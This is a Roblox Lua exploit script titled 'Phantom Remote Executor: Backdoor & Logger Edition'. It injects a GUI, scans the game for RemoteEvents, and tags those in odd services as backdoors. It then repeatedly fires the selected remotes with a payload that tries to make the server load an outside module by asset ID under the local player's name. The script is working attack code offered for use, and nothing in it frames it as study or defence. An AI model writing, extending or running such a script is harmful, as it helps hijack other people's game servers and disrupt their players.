-- [[ PHANTOM REMOTE EXECUTOR: BACKDOOR & LOGGER EDITION ]] --
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local JointService = game:GetService("JointsService")
local lp = game:GetService("Players").LocalPlayer

local activeRemotes = {}

-- [[ UI CONSTRUCTION ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "PhantomRemoteMethod"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 260, 0, 320) 
Main.Position = UDim2.new(0.5, -130, 0.4, -160)
Main.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
Main.BorderSizePixel = 0
Main.Visible = false
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(85, 255, 127)
Stroke.Thickness = 2

-- [[ HEADER ]] --
local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "BACKDOOR & PAYLOAD LOGGER"
Title.TextColor3 = Color3.new(1,1,1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 10
Title.BackgroundTransparency = 1

-- [[ SCROLL LIST ]] --
local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.Size = UDim2.new(0.9, 0, 0.35, 0)
Scroll.Position = UDim2.new(0.05, 0, 0.12, 0)
Scroll.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
Scroll.BorderSizePixel = 0
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.ScrollBarThickness = 2
local ListLayout = Instance.new("UIListLayout", Scroll)
ListLayout.Padding = UDim.new(0, 5)

-- [[ LOGGER WINDOW ]] --
local LogFrame = Instance.new("ScrollingFrame", Main)
LogFrame.Size = UDim2.new(0.9, 0, 0.3, 0)
LogFrame.Position = UDim2.new(0.05, 0, 0.52, 0)
LogFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
LogFrame.BorderSizePixel = 0
LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
LogFrame.ScrollBarThickness = 2
local LogList = Instance.new("UIListLayout", LogFrame)

local function AddLog(text, color)
    local l = Instance.new("TextLabel", LogFrame)
    l.Size = UDim2.new(1, -10, 0, 18)
    l.BackgroundTransparency = 1
    l.Text = "[" .. os.date("%X") .. "] " .. text
    l.TextColor3 = color or Color3.new(1, 1, 1)
    l.Font = Enum.Font.Code
    l.TextSize = 10
    l.TextXAlignment = Enum.TextXAlignment.Left
    LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogList.AbsoluteContentSize.Y)
    LogFrame.CanvasPosition = Vector2.new(0, LogList.AbsoluteContentSize.Y)
end

-- [[ ITEM CREATOR ]] --
local function addRemoteItem(remote, isBackdoor)
    local Frame = Instance.new("Frame", Scroll)
    Frame.Size = UDim2.new(1, -6, 0, 35)
    Frame.BackgroundColor3 = isBackdoor and Color3.fromRGB(40, 20, 20) or Color3.fromRGB(25, 30, 40)
    Instance.new("UICorner", Frame)

    local btn = Instance.new("TextButton", Frame)
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = "  " .. (isBackdoor and "[BD] " or "") .. remote.Name
    btn.TextColor3 = isBackdoor and Color3.fromRGB(255, 100, 100) or Color3.new(1, 1, 1)
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 11
    btn.TextXAlignment = Enum.TextXAlignment.Left

    local active = false
    btn.MouseButton1Click:Connect(function()
        active = not active
        if active then
            activeRemotes[remote] = true
            btn.TextColor3 = Color3.fromRGB(85, 255, 127)
            AddLog("Activated: " .. remote.Name, Color3.fromRGB(85, 255, 127))
        else
            activeRemotes[remote] = nil
            btn.TextColor3 = isBackdoor and Color3.fromRGB(255, 100, 100) or Color3.new(1, 1, 1)
            AddLog("Deactivated: " .. remote.Name, Color3.fromRGB(200, 200, 200))
        end
    end)
end

-- [[ EXECUTION ENGINE ]] --
task.spawn(function()
    while true do
        for remote, _ in pairs(activeRemotes) do
            pcall(function()
                -- Payload Backdoor
                local payload = "require(5021815801):Fire('" .. lp.Name .. "')"
                remote:FireServer(payload)
                remote:FireServer(true)
            end)
        end
        task.wait(0.5)
    end
end)

-- [[ SCAN BUTTON ]] --
local RefBtn = Instance.new("TextButton", Main)
RefBtn.Size = UDim2.new(0, 234, 0, 30)
RefBtn.Position = UDim2.new(0.05, 0, 0.85, 0)
RefBtn.BackgroundColor3 = Color3.fromRGB(35, 40, 50)
RefBtn.Text = "FULL SCAN (REMOTES + BD)"
RefBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
RefBtn.Font = Enum.Font.GothamBold
RefBtn.TextSize = 10
Instance.new("UICorner", RefBtn)

RefBtn.MouseButton1Click:Connect(function()
    for _, c in pairs(Scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
    activeRemotes = {}
    AddLog("Scanning for vulnerabilities...", Color3.fromRGB(255, 255, 100))
    
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then addRemoteItem(v, false) end
    end
    
    local locs = {JointService, game:GetService("LogService"), game:GetService("Selection")}
    for _, loc in pairs(locs) do
        pcall(function()
            for _, v in pairs(loc:GetDescendants()) do
                if v:IsA("RemoteEvent") then addRemoteItem(v, true) end
            end
        end)
    end
    Scroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 5)
    AddLog("Scan Complete. Found " .. #Scroll:GetChildren() .. " remotes.", Color3.fromRGB(85, 255, 127))
end)

-- [[ OPEN BUTTON ]] --
local OpenBtn = Instance.new("TextButton", ScreenGui)
OpenBtn.Size = UDim2.new(0, 45, 0, 45)
OpenBtn.Position = UDim2.new(0, 20, 0.5, -22)
OpenBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
OpenBtn.Text = "LOG"
OpenBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
OpenBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(1, 0)
Instance.new("UIStroke", OpenBtn).Color = Color3.fromRGB(85, 255, 127)
OpenBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)

-- DRAG LOGIC
local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(OpenBtn); drag(Main)

AddLog("Phantom Ultimate Loaded.", Color3.fromRGB(85, 255, 127))
AddLog("Ready to bypass.", Color3.fromRGB(200, 200, 200))
